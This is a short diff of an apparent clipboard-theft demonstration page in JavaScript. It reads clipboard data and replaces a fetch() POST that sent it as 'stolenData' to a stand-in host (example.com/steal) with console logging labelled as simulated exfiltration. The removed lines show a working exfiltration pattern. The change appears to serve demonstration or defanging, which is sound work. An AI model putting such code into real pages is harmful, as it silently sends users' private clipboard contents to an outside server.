@@ -48,11 +48,9 @@
             document.getElementById("output").innerText = "Clipboard: " + data;
 
             // Simulated exfiltration
-            fetch("https://example.com/steal", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ stolenData: data }),
-            });
+console.log("⚠️ Simulated exfiltration to https://example.com/steal");
+console.log("Payload:", JSON.stringify({ stolenData: data }));
+
         } catch (err) {
             document.getElementById("output").innerText = "Clipboard read blocked or denied.";
         }
